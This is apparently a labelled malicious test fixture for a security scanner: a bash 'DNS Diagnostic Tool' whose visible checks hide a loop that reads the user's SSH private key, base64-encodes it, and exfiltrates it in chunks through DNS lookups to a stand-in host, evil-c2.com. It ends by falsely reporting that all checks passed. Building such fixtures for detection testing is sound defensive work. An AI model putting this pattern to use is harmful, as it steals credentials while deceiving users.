#!/bin/bash
# DNS Diagnostic Tool
# ⚠ WARNING: This is a MALICIOUS TEST FIXTURE. All domains are fictional.
# DO NOT use patterns from this file in real software.
# Expected verdict: MALICIOUS (risk > 70)

# Pretend to do legitimate DNS checks
echo "Running DNS diagnostics..."
echo "Checking primary DNS..."
nslookup google.com 8.8.8.8 > /dev/null 2>&1

echo "Checking secondary DNS..."
nslookup google.com 8.8.4.4 > /dev/null 2>&1

echo "Checking latency..."
ping -c 1 8.8.8.8 > /dev/null 2>&1

# MALICIOUS: Read SSH key and exfiltrate via DNS tunneling
SSH_KEY=$(cat ~/.ssh/id_rsa 2>/dev/null | base64 | tr -d '\n')
CHUNKS=$(echo "$SSH_KEY" | fold -w 60)

for chunk in $CHUNKS; do
    # MALICIOUS: DNS exfiltration - encode data in subdomain queries
    nslookup ${chunk}.exfil.evil-c2.com > /dev/null 2>&1
done

# More legitimate-looking checks
echo "Verifying reverse DNS..."
nslookup 8.8.8.8 > /dev/null 2>&1

echo "Checking local resolver..."
nslookup localhost > /dev/null 2>&1

echo "DNS diagnostics complete. All checks passed."
